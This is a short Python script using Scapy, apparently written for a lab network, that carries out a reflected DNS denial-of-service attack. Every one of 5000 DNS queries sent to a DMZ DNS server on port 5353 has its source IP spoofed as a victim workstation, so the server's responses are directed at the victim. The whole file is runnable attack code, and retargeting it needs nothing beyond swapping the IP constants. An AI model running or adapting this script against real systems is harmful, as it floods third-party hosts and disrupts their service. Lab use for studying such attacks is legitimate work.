#!/usr/bin/env python3
"""
Reflected DNS DDoS Attack

Attacker: internet (10.2.0.2)
Victim: ws2 (10.1.0.2)
Reflector: DNS server in the DMZ (10.12.0.20)
Technique: IP spoofing + DNS reflection over UDP port 5353
"""
from scapy.all import *
import time

# Victim: workstation that will receive the reflected traffic
VICTIM_IP = "10.1.0.2"

# Reflector: DNS server in the DMZ
DNS_SERVER_IP = "10.12.0.20"
DNS_PORT = 5353

# Number of spoofed requests
COUNT = 5000

# Small delay between packets
DELAY = 0.001

def reflected_dns_ddos():
    print("[*] Starting reflected DNS DDoS attack")
    print(f"[*] Attacker sends DNS requests to {DNS_SERVER_IP}:{DNS_PORT}")
    print(f"[*] Source IP is spoofed as victim: {VICTIM_IP}")
    print("[*] The DNS server should send responses to the victim")

    for i in range(COUNT):
        pkt = (
            IP(src=VICTIM_IP, dst=DNS_SERVER_IP)
            / UDP(sport=RandShort(), dport=DNS_PORT)
            / DNS(
                rd=1,
                qd=DNSQR(qname="example.com", qtype="A")
            )
        )

        send(pkt, verbose=0)

        if i % 500 == 0:
            print(f"  Sent {i} spoofed DNS requests")

        time.sleep(DELAY)

    print("[+] Attack finished")

if __name__ == "__main__":
    reflected_dns_ddos()
